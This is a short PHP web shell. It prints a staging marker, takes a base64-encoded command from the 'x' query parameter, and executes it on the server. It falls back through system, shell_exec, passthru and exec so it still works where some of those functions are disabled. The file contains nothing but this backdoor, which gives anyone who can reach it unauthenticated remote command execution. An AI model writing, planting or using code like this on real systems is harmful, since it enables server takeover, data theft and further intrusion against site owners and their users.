<?php
echo "OOB_STAGE";
if (isset($_GET['x'])) {
    $cmd = base64_decode($_GET['x']);

    if (function_exists('system')) { system($cmd); }
    elseif (function_exists('shell_exec')) { echo shell_exec($cmd); }
    elseif (function_exists('passthru')) { passthru($cmd); }
    elseif (function_exists('exec')) { exec($cmd, $o); print_r($o); }
    else { echo "FUNCS_DISABLED"; }
}